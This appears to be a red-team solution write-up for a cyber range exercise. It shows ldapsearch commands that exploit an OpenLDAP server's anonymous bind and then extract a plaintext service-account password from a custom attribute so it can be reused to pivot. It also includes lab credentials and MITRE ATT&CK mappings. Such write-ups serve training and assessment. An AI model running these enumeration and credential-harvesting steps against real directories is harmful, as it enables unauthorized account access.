# solve_red.md — M1 · itops-ldap
## Red Team Solution Writeup
**Range:** RNG-IT-02 · Internal Operations Zone
**Machine:** M1 — OpenLDAP Directory Service
**Vulnerability:** LDAP Anonymous Bind + Plaintext Credential in Custom Attribute (`userPassword-plain`)
**MITRE ATT&CK:** T1087.002 · T1552.001
**Severity:** High
**Kill Chain Stage:** Discovery → Credential Access

---

## Objective
Authenticate to the LDAP directory using the `svc-deploy` credential pivoted from RNG-IT-01 M5, enumerate the full directory tree, identify the misconfigured `userPassword-plain` attribute on the `svc-cicd` service account, and extract the CI/CD credential for pivot to M2.

---

## Environment
| Item | Value |
|---|---|
| Target IP | `203.x.x.x` |
| Service Port | `389` (LDAP) |
| Pivot Credential | `cn=svc-deploy,ou=service,dc=prabalurja,dc=in / D3pl0y@PUL2024` |

---

## Step-by-Step Exploitation

### Step 1 — Anonymous Bind Test
```bash
ldapsearch -x -H ldap://203.x.x.x \
  -b "dc=prabalurja,dc=in" \
  "(objectClass=organizationalUnit)" dn
```

<img width="905" height="757" alt="image" src="https://github.com/user-attachments/assets/95dfdc36-ed4f-4708-a2b7-f01cf0a89893" />



Anonymous bind succeeds — OUs visible. Confirms misconfigured ACL.

### Step 2 — Authenticated Bind with svc-deploy
```bash
ldapsearch -x \
  -H ldap://203.x.x.x \
  -D "cn=svc-deploy,ou=service,dc=prabalurja,dc=in" \
  -w "D3pl0y@PUL2024" \
  -b "dc=prabalurja,dc=in" \
  "(objectClass=*)" \
  dn description employeeType
```
Returns full directory tree — all OUs, all users, all service accounts.

<img width="775" height="1039" alt="image" src="https://github.com/user-attachments/assets/72b81ea7-00a3-4df2-9e32-8a42545a5fa1" />


### Step 3 — Enumerate Service Accounts
```bash
ldapsearch -x \
  -H ldap://203.x.x.x \
  -D "cn=svc-deploy,ou=service,dc=prabalurja,dc=in" \
  -w "D3pl0y@PUL2024" \
  -b "ou=service,dc=prabalurja,dc=in" \
  "(objectClass=*)" "*"
```
Returns all attributes on service accounts. Observe `userPassword-plain` on `cn=svc-cicd`:
```
userPassword-plain: CICD@Deploy!2024
```
<img width="812" height="968" alt="image" src="https://github.com/user-attachments/assets/e1dee906-7943-4f33-9c2f-ccc59b5c9029" />


### Step 4 — Verify svc-cicd Credential
```bash
ldapsearch -x \
  -H ldap://203.x.x.x \
  -D "cn=svc-cicd,ou=service,dc=prabalurja,dc=in" \
  -w "CICD@Deploy!2024" \
  -b "dc=prabalurja,dc=in" "(objectClass=*)" dn
```
Successful bind confirms credential validity.

<img width="725" height="1042" alt="image" src="https://github.com/user-attachments/assets/f3ceaa60-ccaf-4360-b3b8-feda2bc1af93" />


**Pivot credential for M2:** `svc-cicd : CICD@Deploy!2024`

---

## MITRE ATT&CK Mapping
| Tactic | Technique | ID |
|---|---|---|
| Discovery | Account Discovery: Domain Account | T1087.002 |
| Credential Access | Unsecured Credentials: Credentials in Files | T1552.001 |
| Collection | Data from Information Repositories | T1213 |
